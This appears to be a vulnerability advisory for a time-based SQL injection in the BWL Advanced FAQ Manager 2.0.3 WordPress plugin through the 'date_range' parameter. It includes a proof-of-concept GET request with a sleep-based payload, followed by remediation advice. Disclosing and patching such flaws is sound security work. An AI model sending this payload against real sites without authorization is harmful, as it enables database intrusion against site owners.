### SQL Injection:

SQL injection is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It usually involves the insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases, issue commands to the operating system.

### Affected Components:

> Plugin: BWL Advanced FAQ Manager
> Version: 2.0.3
> Affected Parameter: 'date_range'
> Affected Page: /wp-admin/edit.php

### Description:

The vulnerability exists within the 'date_range' parameter that is used in the 'bwl-advanced-faq-analytics' page of the BWL Advanced FAQ Manager plugin. By manipulating the input to this parameter, authenticated attackers can execute arbitrary SQL commands within the database.

## Proof of Concept:

### Manual Exploitation

The following GET request demonstrates the vulnerability:

```
GET /wp-admin/edit.php?page=bwl-advanced-faq-analytics&post_type=bwl_advanced_faq&filter_type=views&date_range=(selectfrom(select(sleep(20)))a)&faq_id=all HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost/wp-admin/edit.php?post_type=bwl_advanced_faq&page=bwl-advanced-faq-analytics
Connection: close
Cookie: [Relevant Cookies]
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```

If the server response is delayed by approximately 20 seconds, it indicates a successful exploitation of the time-based SQL Injection, confirming the vulnerability.

## Recommendations

Users of BWL Advanced FAQ Manager v2.0.3 are advised to update the plugin as soon as a fixed version is released. Furthermore, it is crucial to implement strict input validation and sanitization for all user-supplied data. Using parameterized queries or prepared statements to handle SQL queries securely can help mitigate such vulnerabilities.
